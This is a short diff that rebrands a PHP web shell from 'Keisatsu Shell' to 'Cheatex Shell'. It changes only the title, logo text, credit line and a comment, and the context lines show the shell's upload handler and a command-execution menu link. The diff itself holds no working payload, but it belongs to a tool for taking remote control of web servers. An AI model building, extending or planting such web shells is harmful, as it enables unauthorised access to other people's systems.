@@ -58,7 +58,7 @@ if($_POST['upload']){
 <html>
   <head>
     <meta charset="utf-8">
-    <title>Keisatsu Shell V1</title>
+    <title>Cheatex Shell V1</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.99.0/css/materialize.min.css">
     <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
 
@@ -83,7 +83,7 @@ if($_POST['upload']){
     </ul>
     <nav>
       <div class="nav-wrapper teal darken-3">
-        <a href="#" class="brand-logo">Keisatsu_Shell</a>
+        <a href="#" class="brand-logo">Cheatex_Shell</a>
         <ul id="nav-mobile" class="right hide-on-med-and-down">
           <li><a href="?">Home</a></li>
           <li><a href="?act=cmd&#38;dir=<?php print path(); ?>">Cmd</a></li>
@@ -134,7 +134,7 @@ if($_POST['upload']){
             </div><hr>
             <?php content(); ?>
             <hr>
-            <p>Keisatsu_Shell ~ Thanks to IndoXploit</p>
+            <p>Cheatex_Shell ~ Thanks to IndoXploit</p>
           </div>
         </div>
     </div>
@@ -598,5 +598,5 @@ print '</table>';
         indexing();
       }
     }
-// keisatsu shell
+// Cheatex shell
 ?>
